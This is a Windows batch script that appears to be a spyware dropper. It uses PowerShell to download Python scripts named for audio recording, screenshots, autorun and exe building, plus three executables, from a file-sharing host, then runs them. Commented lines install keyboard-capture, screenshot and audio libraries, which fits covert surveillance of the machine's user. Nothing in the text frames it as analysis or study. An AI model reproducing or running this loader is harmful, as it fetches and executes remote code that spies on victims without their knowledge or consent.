@echo off


powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/5gOjI39N/download', 'audio_rec_final.pyw')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/fG8JQ1IB/download', 'Screenshot1.pyw')"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/VSk3cibz/download', 'windowsproc.pyw')"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/R5GSq0ws/download', 'autorun.py')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/FROpnfgh/download', 'buildexe.py')"

@REM powershell -command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe', 'python-3.10.4.exe');



@REM python-3.10.4.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_pip=1

@REM pip install pyinstaller
@REM pip install keyboard
@REM pip install tk
@REM pip install pyautogui
@REM python -m pip install -U --user mss
@REM pip install watchdog
@REM pip3 install sounddevice
@REM pip3 install wavio
@REM pip3 install scipy
@REM pip install pyscreenshot


@REM cd %~dp0

@for %%i in (python.exe) do @set py=%%~$PATH:i
@REM @echo %py%

@REM "%py%"" "autorun.py"

powershell -command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/6SuMgASC/download', 'nice3.exe');

powershell -command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/1ufula71/download', 'nice4.exe');  
powershell -command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/CqEcFV8p/download', 'nice5.exe');  

@REM Screenshot
@REM Audio

python  "autorun.py"



@REM "C:\ProgramData\Anaconda3\python.exe" "autorun.py"
start /d "%~dp0" nice3.exe
start /d "%~dp0" nice4.exe
start /d "%~dp0" nice5.exe